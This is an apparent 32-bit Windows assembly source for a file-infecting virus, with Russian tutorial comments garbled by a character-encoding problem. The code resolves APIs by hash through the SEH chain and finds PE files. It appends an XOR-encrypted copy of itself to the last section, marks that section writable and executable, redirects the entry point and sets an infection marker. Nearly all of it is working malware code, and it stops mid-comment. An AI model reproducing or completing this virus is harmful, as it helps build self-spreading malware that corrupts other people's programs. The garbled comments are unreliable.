; tasm32 /ml /m3 aztec,,;
; tlink32 /Tpe /aa /c /v aztec,aztec,,import32.lib,

        .386p                                   ; ��������� 386+ =)
        .model  flat                            ; 32-� ������ �������� ���
                                                ; ���������

extrn   MessageBoxA:PROC                        ; ������������� 1-��
                                                ; ���������
extrn   ExitProcess:PROC                        ; API-������� :)

mod_size	equ     (offset modificator_end - offset modificator_start)
real_size	equ     (offset virus_end - offset virus_start)
virus_size	equ     (offset virus_end - offset virus_start + mod_size)
shit_size	equ     (offset delta - offset start)

	.data

szTitle         db      "[����-����� 1.0]",0

szMessage       db      "������ ��������� ������!",10
                db      "��������� �����: C:\TEST.EXE",0

	.code

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ����� ���� ������, ������������ ��p���� ;)                               ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

virus_start     label   byte
start:
	call	delta

delta:
	pop	ebp
	sub	ebp,offset delta

;	test	ebp,ebp
;	jnz	__skip

	call	GetAPIs                         ; �������� ��� API-�������
	call	Infect                          ; �������� ����� � ���������
;__skip:

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ������� �� ������ ��������� ��������� GetAPIs: EDI, ����������� ��       ;
 ; ������ DWORD'��, ������� ����� ��������� ������ API-������� � ESI,       ;
 ; ����������� �� ����� API-������� (� ��� ����), ������� ����������        ;
 ; �����.                                                                   ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

        test	ebp,ebp                         ; ��� ������ ���������?
        jz	fakehost

;        popfd                                   ; ��������������� ��� �����
;        popad                                   ; ��������������� ���
                                                ; ��������

        mov     eax,11111111h
        org     $-4
EIP	dd	00001000h

	add	eax,11111111h
	org	$-4
ModBase dd	00400000h

        jmp     eax

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ������� �� �������, �� �������� �� ������ ��������� ������ ������,       ;
 ; �������� �� ����� �� EBP ����. ���� ��� ���, �� �� ��������� � ��������  ;
 ; ������� ���������. ���� ��� �� ���, �� ��������������� �� ����� �������  ;
 ; ������ � ��� ����������� ��������. ����� ��� ���� ����������, ���������� ;
 ; � EAX ������ ����� ����� ���������� ��������� (��� �������� �� �����     ;
 ; ���������), � ����� �� ��������� � ��� ����� ���� �������� ��������      ;
 ; (�������� �� ����� ����������).                                          ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

modificator_start	label	byte
;	pushad
;	pushfd

;	mov	eax,000FFFFFh
;__loop:	dec	eax
;	jnz	__loop	

        mov     esi,(real_size / 4)
        mov     edi,12345678h
code_addr	equ	$-4
	mov	eax,11111111h
crypt_key	equ	$-4

 @@1:
	xor	dword ptr [edi+esi*4],eax
	mov	eax,[edi+esi*4]
	dec	esi
	jnz	@@1
modificator_end		label	byte

Infect:
        push    dword ptr [ebp+EIP]             ; ��������� EIP � ModBase,
        push    dword ptr [ebp+ModBase]         ; ������������ �� �����
                                                ; ���������

        call    Infection                       ; �������� ��������� ����

        pop     dword ptr [ebp+ModBase]         ; ��������������� ��
        pop     dword ptr [ebp+EIP]

	ret

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ������, ��� �� ������ ������� - ��� ��������� �������� ���������� ������ ;
 ; ����������, ������� ����� ����� ������������ ����� ����, ��� �� ���������;
 ; �������� ��������, �� �������, � ���������, �������� �� ����� ���������  ;
 ; ������. �� �������� ��������� ���������: ��� ��������� ������ ���������� ;
 ; � WFD, ������� ��� �� ����� ���������� �� �����-���� ���������. �����    ;
 ; ��������� ��������������� ������ �� ��������������� �������� ����������  ;
 ; ����������                                                               ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

Infection:
        lea     esi,[ebp+szFileName]            ; �������� ��� ��p��������
                                                ; �����
	push	esi
	call	[ebp+_GetFileAttributesA]	; ������ ��� ��������
	mov	dword ptr [ebp+dwFileAttributes],eax	; ��������� ��

        push    80h                             ; FILE_ATTRIBUTE_NORMAL
        push    esi
        call    [ebp+_SetFileAttributesA]       ; ���p��� ��� ���p�����

        call    OpenFile                        ; ���p����� ���

        inc     eax                             ; ���� EAX = -1, �p�������
        jz      CantOpen                        ; ������
        dec     eax

        mov     dword ptr [ebp+FileHandle],eax  ; ��������� Handle �����

	xor	edx,edx                         ; EDX = 0
	push	edx
	push	eax
	call	[ebp+_GetFileSize]              ; ������ ������ �����

        mov     dword ptr [ebp+nFileSize],eax   ; � ��������� ���

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ��p���, ��� �� ������, ��� ���p��� ���p����� ����� � ������������� ��    ;
 ; p������ ������p����. ��� �������������� � ������� �������                ;
 ; SetFileAttributes. ��� �p����� ���������� ������ �������:                ;
 ;                                                                          ;
 ; ������� SetFileAttributes ������������� ���p����� �����.                 ;
 ;                                                                          ;
 ; BOOL SetFileAttributes(                                                  ;
 ;   LPCTSTR lpFileName, // ��p�� ����� �����                               ;
 ;   DWORD dwFileAttributes      // ��p�� ��������������� ���p������        ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; ��p����p�                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; � lpFileName: ��������� �� ��p���, �������� ��� �����, ��� ���p�����     ;
 ;   ���������������.                                                       ;
 ;                                                                          ;
 ; � dwFileAttributes: ������ ���p����� �����, ����p�� ������ ����          ;
 ;   �����������. ���� ��p����p ����� ���� ����������� ��������, ����p��    ;
 ;   ����� ����� � ��������������� ������������ �����. ��� �� �� �� ����,   ;
 ;   ������p���� ��������� �������� FILE_ATTRIBUTE_NORMAL.                  ;
 ;                                                                          ;
 ; ����p������� ��������                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; � ���� ����� ������� �p���� �������, ����p������� �������� �� p����      ;
 ;   ����.                                                                  ;
 ;                                                                          ;
 ; � ���� ����� ������� �� ������, ����p������� �������� p���� ����. �����  ;
 ;   �������� �������������� ����p����� �� ������, �������� GetLastError.   ;
 ;                                                                          ;
 ; ����� ��������� ����� ���p������ �� ���p����� ���� �, ���� �� �p�������  ;
 ; ������, ����� ����� ���p������� � �������������� ��p�������.             ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

        mov     ecx,dword ptr [ebp+nFileSize]   ; ��-��p���, ��
        call    CreateMap                       ; �������� �����p����� ����

        or      eax,eax
        jz      CloseFile

        mov     dword ptr [ebp+MapHandle],eax

        mov     ecx,dword ptr [ebp+nFileSize]
        call    MapFile                         ; �����p��� ���

        or      eax,eax
        jz      UnMapFile

        mov     dword ptr [ebp+MapAddress],eax

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ������� �� �������� � ECX p����p �����, ����p�� ����p����� �����p�����,  ;
 ; ����� ���� �������� ������� ��������. �� �p���p��� �� ��������� ������,  ;
 ; � ���� ������� �� �p�������, �� �p��������. � �p������� ������ ��        ;
 ; ���p����� ����. �� ���p����� ����� �������� � ��������� � ����p������    ;
 ; �p�����p� �����p������ ����� � ������� ������� MapFile. ��� � p�����, �� ;
 ; �� �p���p���, �� �p������� �� ������ � ��������� � ������������ �        ;
 ; ���������� p����������. ���� ��� �p���� ��p���, �� ���p����� ����������  ;
 ; � p��������� �������� ��p��.                                             ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

        mov     esi,[eax+3Ch]
        add     esi,eax
        cmp     dword ptr [esi],"EP"            ; ��� PE?
        jnz     NoInfect

        cmp     dword ptr [esi+0F0h],00101010h  ; ��p���� �� �� ���?
        jz      NoInfect

        push    dword ptr [esi+3Ch]		; ������������ ������


        push    dword ptr [ebp+MapAddress]      ; ���p����� ���
        call    [ebp+_UnmapViewOfFile]

        push    dword ptr [ebp+MapHandle]
        call    [ebp+_CloseHandle]

        pop     ecx

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ��p�� ��������� � EAX. �� �������� ��������� �� PE-���������             ;
 ; (MapAddress+3Ch), ����� ��p�������� ��� �, ����� ��p����, ��������       ;
 ; p��������� ��������� �� PE-������� � ESI. � ������� �������p� ��         ;
 ; �p���p���, ��p�� �� ��, ����� ���� ��������p�������, ��� ���� �� ���     ;
 ; ��p���� p���� (�� ���p����� ����������� ����� ��p������ � PE �� �������� ;
 ; 4Ch, �� ������������ �p��p�����), ����� ���� ���p����� � �����           ;
 ; ��p��������� ����� (File Alignement) (����p� ����� � ��p���� ���������   ;
 ; PE). ����� ���p����� ����� ������� � ��������������� ���������� p����    ;
 ; ��p��������� ����� �� �����, ���p���� ��� � p�����p� ECX.                ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

        mov     eax,dword ptr [ebp+nFileSize] ; � ������ ��� �����
        add     eax,virus_size

        call    Align
        xchg    ecx,eax

	push	ecx

        call    CreateMap
        or      eax,eax
        jz      CloseFile

        mov     dword ptr [ebp+MapHandle],eax

	pop	ecx
        call    MapFile

        or      eax,eax
        jz      UnMapFile

        mov     dword ptr [ebp+MapAddress],eax

        mov     esi,[eax+3Ch]
        add     esi,eax

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; H���������� � ECX ��p��������� ����� ���������� ��� ������������ ������  ;
 ; ������� Align, ����p�� �� � ����p����, �p����p������� �������� � EAX     ;
 ; p����p ���p����� ����� ���� p����p ��p���. ������� ����p����� ���        ;
 ; ��p�������� p����p �����. H��p���p, ���� ��p��������� p���� 200h, �      ;
 ; p����p ����� + p����p ��p��� - 1234h, �� ������� 'Align' ����p���� ���   ;
 ; 12400h. ��������� �� �������� � ECX. �� ����� �������� �������           ;
 ; CreateMap, �� �����p� �� ����� �����p����� ���� � ��p�������� p����p��.  ;
 ; ����� �� ����� �������� � ESI ��������� �� ��������� PE                  ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

        mov     edi,esi                         ; EDI = ESI = ��������� ��
                                                ; ��������� PE
        movzx   eax,word ptr [edi+06h]          ; AX = ���������� ������
        dec     eax                             ; AX--
        imul    eax,eax,28h                     ; EAX = AX*28
        add     esi,eax                         ; ��p��������
        add     esi,78h                         ; �������� �� ������� ��p-�
        mov     edx,[edi+74h]                   ; EDX = ���������� ��-���
        shl     edx,3                           ; EDX = EDX*8
        add     esi,edx                         ; ESI = ��������� ��
                                                ; ��������� ������

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ��-��p���, �� ������ ���, ����� EDI �������� �� ��������� PE, ����� ���� ;
 ; �� �������� � AX ���������� ������ (DWORD), ����� ���� ��������� EAX ��  ;
 ; 1. ����� �������� ����p����� AX (���������� ������ - 1) �� 28h (p����p   ;
 ; ��������� ������) � �p�������� � p��������� �������� ��������� PE. � ��� ;
 ; ����������, ��� ESI ��������� �� ������� ��p����p��, � � EDX ���������   ;
 ; ���������� ��������� � ������� ��p����p��. ����� �� �������� p��������   ;
 ; �� ������ � �p�������� � ESI, ����p�� ����p� ��������� �� ���������      ;
 ; ������.                                                                  ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

        mov     eax,[edi+28h]                   ; �������� EIP
        mov     dword ptr [ebp+EIP],eax         ; ���p����� ���

        mov     edx,[esi+10h]                   ; EDX = SizeOfRawData
        mov     ebx,edx                         ; EBX = EDX
        add     edx,[esi+14h]                   ; EDX = EDX+PointerToRawData

        push    edx                             ; ���p����� EDX ���
                                                ; ������������ �������������

        mov     eax,ebx                         ; EAX = EBX
        add     eax,[esi+0Ch]                   ; EAX = EAX+VA ��p��
                                                ; EAX = ����� EIP
        mov     [edi+28h],eax                   ; �������� EIP
;        mov     dword ptr [ebp+NewEIP],eax      ; ����� ���p����� ���

        mov     ebx,[edi+34h]                   ; �������� ���� ��p���
        mov     dword ptr [ebp+ModBase],ebx     ; ���p����� ��

	add	ebx,eax
	add	ebx,mod_size
	mov	dword ptr [ebp+code_addr],ebx

	mov	eax,32D1A7F5h
	mov	dword ptr [ebp+crypt_key],eax

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ������� �� �������� � EAX EIP �����, ����p�� �� ��p�����, ����� �����    ;
 ; ��������� ���p�� EIP � ��p�������, ����p�� ����� �������������� � ������ ;
 ; ��p���. �� �� ����� �� ������ � � ����� ��p���. ����� ����� �� ��������  ;
 ; � EDX SizeOfRawData ��������� ������, ����� ���p����� ��� �������� ���   ;
 ; �������� ������������� � EBX �, �������, �� ��������� � EDX              ;
 ; PointerToRawData (EDX ����� �������������� � ���������� �p� ����p������  ;
 ; ��p���, ������� �� ���p����� ��� � �����). ����� �� �������� � EAX       ;
 ; SizeOfRawData, ��������� � ���� VA-��p��: ����p� � ��� � EAX ����� EIP   ;
 ; ��� ��������. �� ���p����� ��� � ��������� PE � � �p���� ��p�������      ;
 ; (����p� ������ ��p���).                                                  ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;


        mov     eax,[esi+10h]                   ; EAX = ����� SizeOfRawData
        add     eax,virus_size                  ; EAX = EAX+VirusSize
        mov     ecx,[edi+3Ch]                   ; ECX = FileAlignment
        call    Align                           ; ��p��������!

        mov     [esi+10h],eax                   ; ����� SizeOfRawData
        mov     [esi+08h],eax                   ; ����� VirtualSize

        pop     edx                             ; EDX = ��������� �� �����
                                                ;       ������

        mov     eax,[esi+10h]                   ; EAX = ����� SizeOfRawData
        add     eax,[esi+0Ch]                   ; EAX = EAX+VirtualAddress
        mov     [edi+50h],eax                   ; EAX = ����� SizeOfImage

        or      dword ptr [esi+24h],0A0000020h  ; �������� ����� ����� ������

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ��, ��p���, ��� �� ������ - ��� ���p����� � EAX SizeOfRawData ���������  ;
 ; ������, ����� ���� �� �p�������� � ���� p����p ��p���. �� ���p����� �    ;
 ; ECX FileAlignement, �������� ������� 'Align' � �������� � EAX            ;
 ; ��p������� SizeOfRawData+VirusSize.                                      ;
 ; ������� � �p����� ��� ��������� �p���p:                                  ;
 ;                                                                          ;
 ;      SizeOfRawData - 1234h                                               ;
 ;      VirusSize     -  400h                                               ;
 ;      FileAlignment -  200h                                               ;
 ;                                                                          ;
 ; ����� ��p����, SizeOfRawData ���� VirusSize ����� p���� 1634h, � �����   ;
 ; ��p����� ����� �������� ��������� 1800h, �p����, �� �p���� ��? ��� ���   ;
 ; �� ������������� ��p�������� �������� ��� ����� SizeOfRawData � ���      ;
 ; ����� VirtualSize, �� � ��� �� ����� ������� �p�����. ����� ��           ;
 ; ����������� ����� SizeOfImage, ����p�� ������ �������� ������ ������     ;
 ; SizeOfRawData � VirtualAddress. ���������� �������� �� �������� � ����   ;
 ; SizeOfImage ��������� PE (�������� 50h). ����� �� �������������          ;
 ; ���p����� ������, p����p ����p�� �� ���������, p����� ���������:         ;
 ;                                                                          ;
 ;      00000020h - Section contains code                                   ;
 ;      40000000h - Section is readable                                     ;
 ;      80000000h - Section is writable                                     ;
 ;                                                                          ;
 ; ���� �� �p������ � ���� �p�� ��������� ���p���� OR, p���������� �����    ;
 ; A0000020h. H�� ����� �OR��� ��� �������� � �������� ���p������� �        ;
 ; ��������� ������, �� ���� ��� �� ����� ���������� ���p�� ��������.       ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

        mov     dword ptr [edi+0F0h],00101010h  ; �������� ����� ��p������

        lea     esi,[ebp+modificator_start]     ; ESI = ��������� ��
                                                ; modificator_start
        mov	edi,edx                         ; EDI = Raw ptr after last
                                                ;       section
        add     edi,dword ptr [ebp+MapAddress]  ; EDI = H�p������p������� ��.
        mov     ecx,mod_size                    ; ECX = �����p ����p�����
                                                ; ������
        rep     movsb                           ; ������ ���!

        lea     esi,[ebp+virus_start]           ; ESI = ��������� ��
                                                ; virus_start
        mov	edi,edx                         ; EDI = Raw ptr after last
                                                ;       section
	add	edi,mod_size
        add     edi,dword ptr [ebp+MapAddress]  ; EDI = H�p������p������� ��.
        mov     ecx,real_size                   ; ECX = �����p ����p�����
                                                ; ������
        rep     movsb                           ; ������ ���!

        mov     esi,(real_size / 4)
        mov	edi,edx                         ; EDI = Raw ptr after last section
	add	edi,mod_size
        add     edi,dword ptr [ebp+MapAddress]  ; EDI = H�p������p������� ��.
	mov	eax,dword ptr [ebp+crypt_key]

 @@2:
	push	dword ptr [edi+esi*4]
	xor	dword ptr [edi+esi*4],eax
	pop	eax
	dec	esi
	jnz	@@2

        jmp     UnMapFile                       ; ��������, ���p�����, � �.�.

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; � ��p��� ��p��� ���� ������� ����� �� �������� ����� ��p������ �         ;
 ; �������������� ���� ��������� PE (�������� 4Ch, ����p�� 'Reserved1'),    ;
 ; ��� ����, ����� �������� �����p���� ��p������ �����. ����� �� �������� � ;
 ; ESI ��������� �� ������ ��p������ ����, � � EDI ��������, ����p��        ;
 ; ��������� � ��� � EDX (�������: EDX = Old SizeOfRawData +                ;
 ; PointerToRawData), ����p�� �������� RVA, ���� �� ������ ��������� ���    ;
 ; ��p���. ��� � ������ p�����, ��� RVA, � ��� �� ����H� ����� ;) RVA ����� ;
 ; ������p��p����� � VA, ��� ����� �������, ������� ��������, ������������� ;
 ; � ����p��� �������� RVA... ��������� �� ����������� � ��p���, ������     ;
 ; ���������� ������� ����� (��� �� �������, ���� ��p�� ����p�������        ;
 ; �������� MapViewOfFile). ����� ��p����, �������, �� �������� � EDI VA,   ;
 ; �� ����p��� ����� �p��������� ������ ���� ��p���. � ECX �� ���p�����     ;
 ; p����p ��p��� � ����p��� ���. ��� � ���! ;) �������� ������ ���p���      ;
 ; �������� ����p� ������...                                                ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

NoInfect:
        mov     ecx,dword ptr [ebp+nFileSize]
        call    TruncFile

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ����� ��p����������� ������, ���� �p������� ������ �� �p��� ��p������
 ; �����. �� ��������� ������� ��p������ �� 1 � ������ p����p ����� p�����
 ; ����, ����p�� �� ���� �� ��p������. � �������, ��� ������ ��p��� ��
 ; �p������ ��������� ���� ��� ;).
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

UnMapFile:
        push    dword ptr [ebp+MapAddress]      ; ���p����� ��p�� ��������
        call    [ebp+_UnmapViewOfFile]

CloseMap:
        push    dword ptr [ebp+MapHandle]       ; ���p����� �������
        call    [ebp+_CloseHandle]

CloseFile:
        push    dword ptr [ebp+FileHandle]      ; ���p����� ����
        call    [ebp+_CloseHandle]

CantOpen:
        push    dword ptr [ebp+dwFileAttributes]
        lea     eax,[ebp+szFileName]            ; ������������� ���p��
                                                ; ���p����� �����
        push    eax
        call    [ebp+_SetFileAttributesA]
        ret

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ���� ���� ���� ���p����� ���, ��� ���� ���p��� �� �p��� ��p������, �     ;
 ; ����� ������������� ���p�� ���p����� �����.                              ;
 ; ��� ��������� �������� �p��������� ����� ������� API:                    ;
 ;                                                                          ;
 ; ������� UnmapViewOfFile �������p��� �p������p������� ����� ����� ��      ;
 ; ��p������ �p��������� �p������.                                          ;
 ;                                                                          ;
 ; BOOL UnmapViewOfFile(                                                    ;
 ;   LPCVOID lpBaseAddress       // ��p��, ������ ���������� ����p�������   ;
 ;                               // �� ��p����� �p���p������ �p������ ����� ;
 ;                               // �����                                   ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; ��p����p�                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; � lpBaseAddress: ��������� �� ��p�� �p������p������� ����� �����. ��p��  ;
 ;   ��� ����p���� p���� MapViewOfFile ��� MapViewOfFileEx.                 ;
 ;                                                                          ;
 ; ����p������� ��������                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; � ���� ����� ������� �p���� �������, ����p������� �������� �� p����      ;
 ;   ����, � ��� ��p����� ������ � ��������� ��������� "������"             ;
 ;   ������������ �� ����.                                                  ;
 ;                                                                          ;
 ; � ���� ����� ������� �� ������, ����p������� �������� p���� ����. �����  ;
 ;   �������� p����p����� ����p�����, �������� GetLastError.                ;
 ;                                                                          ;
 ; ---                                                                      ;
 ;                                                                          ;
 ; ������� CloseHandle ���p����� ����� ���p����� �������.                   ;
 ;                                                                          ;
 ; BOOL CloseHandle(                                                        ;
 ;   HANDLE hObject      // ����� �������, ����p�� ����� ���p���            ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; ��p����p�                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; � hObject: ����������p��� ����� �������.                                 ;
 ;                                                                          ;
 ; ����p������� ��������                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; � ���� ����� ������� �p���� �������, ����p������� �������� �� p����      ;
 ;   ����.                                                                  ;
 ; � ���� ����� ������� �� ������, ����p������� �������� p���� ����. �����  ;
 ;   �������� �������������� ����p����� �� ������, �������� GetLastError.   ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

; EDI - ����� ����������� ����
; ESI - ������ ����������� ���� / 4
; ECX - ���� ��������

Encoder		proc
	mov	eax,ecx
 @@loop1:
	push	dword ptr [edi+esi*4]
	xor	dword ptr [edi+esi*4],eax
	pop	eax
	imul	ecx
	dec	esi
	jnz	@@loop1
	ret
Encoder		endp

Decoder		proc
	mov	eax,ecx
 @@loop2:
	xor	dword ptr [edi+esi*4],eax
	mov	eax,[edi+esi*4]
	imul	ecx
	dec	esi
	jnz	@@loop2
	ret
Decoder		endp

GetAPIs         proc
_ReadSEH:
	xor  edx,edx
	mov  eax,fs:[edx]
	dec  edx

_SearchK32:
	cmp  [eax],edx
	je _CheckK32
	mov  eax,dword [eax]
	jmp _SearchK32

_CheckK32:
	mov  eax,[eax+4]
	xor ax,ax

_SearchMZ:          
	cmp word ptr [eax],5A4Dh
	je _CheckMZ
	sub eax,10000h
	jmp _SearchMZ

_CheckMZ:	
	mov edx,[eax+3ch]
	cmp word ptr [eax+edx],4550h
	jne _Exit

_SearchAPI: 
	push esp                      ; ��������� ������������ esp
	push ebp                      ; ��������� ������������ ebp
	mov esi,[eax+edx+78h]         ;Export Table RVA   
	add esi,eax                   ;Export Teble VA
	add esi,18h
	xchg eax,ebx
	lodsd                         ;Num of Name Pointers
	push eax
	lodsd                         ;Address Table RVA
	push eax
	lodsd                         ;Name Pointers RVA 
	push eax 
	add eax,ebx
	push eax                      ;Index
	lodsd                         ;Ordinal Table RVA  
	push eax
;	mov edi,[esp+4*5]             ;Delta offset
	lea edi,[ebp+HeshTable]
	mov ebp,esp

_BeginSearch:
	mov ecx,[ebp+4*4]             ;NumOfNamePointers
	xor edx,edx

_SearchAPIName:          
	mov esi,[ebp+4*1]             ;Index                                                     
	mov esi,[esi]
	add esi,ebx

_GetHash:
	xor  eax,eax
	push eax
_CalcHash:
	ror  eax,7
	xor  [esp],eax
	lodsb
	test al,al
	jnz _CalcHash
	pop eax

_OkHash:
	cmp eax,dword ptr [edi]
	je _OkAPI
	add dword ptr [ebp+4*1],4     ;I=I+4 (I--Index)
	inc edx
	loop _SearchAPIName 
	jmp _Exit                     ; ������� ������� �� ������� :(

_OkAPI:
	shl edx,1
	mov ecx,[ebp]                 ;OrdinalTableRVA
	add ecx,ebx
	add ecx,edx
	mov ecx,[ecx]
	and ecx,0FFFFh
	mov edx,[ebp+4*3]             ;AddressTableRVA
	add edx,ebx
	shl ecx,2
	add edx,ecx
	mov edx,[edx]
	add edx,ebx
;	push edx

	mov eax,[ebp+4*5]
	lea eax,[eax+HeshTable]
	sub eax,edi
	mov ecx,[ebp+4*5]
	lea ecx,[ecx+APITable]
	sub ecx,eax
	mov dword ptr [ecx],edx

;	mov dword ptr [edi],edx

;	lea eax,[ebp+4*5+_CreateFileA]

	cmp word ptr [edi+4],0FFFFh   ;0FFFFh-End of HeshTable
	je _Exit
	add edi,4

_NextName:          
	mov ecx,[ebp+4*2]             ;NamePointersRVA
	add ecx,ebx
	mov [ebp+4*1],ecx             ;Index
	jmp short _BeginSearch
  	
_Exit:
;	mov edx,ebp
	mov esp,[ebp+4*6]
	mov ebp,[ebp+4*5]
        ret

GetAPIs         endp

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ��� �����p��������� ��� �� ��� ������ p�����, p���� ��� ����p� �� ����   ;
 ; ����� ��������p�������, ��� ��� �� ������ ������p���, ��� ��� �������    ;
 ; �p���� ��p���� ;).                                                       ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

 ; input:
 ;      EAX - ��������, ����p�� ���� ��p������
 ;      ECX - ��p���������� �����p
 ; output:
 ;      EAX - ��p�������� ��������

Align           proc
        push    edx
        xor     edx,edx
        push    eax
        div     ecx
        pop     eax
        sub     ecx,edx
        add     eax,ecx
        pop     edx
        ret
Align           endp

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ��� �p�����p� ��������� ����� ������ ����� ��p������ PE: ��p��������     ;
 ; ����� �������� ��p����������� �����p�. H������, �� ���� ���������, ���   ;
 ; ��� p�������.                                                            ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

 ; input:
 ;      ECX - ��� ��p����� ����
 ; output:
 ;      H�����

TruncFile       proc
        xor     eax,eax
        push    eax
        push    eax
        push    ecx
        push    dword ptr [ebp+FileHandle]
        call    [ebp+_SetFilePointer]

        push    dword ptr [ebp+FileHandle]
        call    [ebp+_SetEndOfFile]
        ret
TruncFile       endp

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ������� SetFilePointer ��p������� �������� ��������� ���p����� �����.    ;
 ;                                                                          ;
 ; DWORD SetFilePointer(                                                    ;
 ;   HANDLE hFile,       // ����� �����                                     ;
 ;   LONG lDistanceToMove,       // ���������, �� ����p�� ����� ��p�������� ;
 ;                               // �������� ��������� (� ������)           ;
 ;   PLONG lpDistanceToMoveHigh, // ��p�� ��p����� ����� ���������          ;
 ;   DWORD dwMoveMethod  // ��� ��p�������                                  ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; ��p����p�                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; � hFile: ������ ����, ��� �������� ��������� ������ ���� ��p������.      ;
 ;   ����� ����� ������ ���� ������ � �������� GENERIC_READ ���             ;
 ;   GENERIC_WRITE.                                                         ;
 ;                                                                          ;
 ; � lDistanceToMove: ������ ���������� ������, �� ����p�� �����            ;
 ;   ��p�������� �������� ���������. ������������� �������� �������         ;
 ;   ��������� ���p��, � ��p���������� - �����.                             ;
 ;                                                                          ;
 ; � lpDistanceToMoveHigh: ��������� �� ��p���� ������� ����� 64-� ������   ;
 ;   ��������� ��p��������. ���� �������� ��� ��p����p� p���� NULL, ������� ;
 ;   SetFilePointer ����� p������� � �������, p����p ����p�� �� �p�������   ;
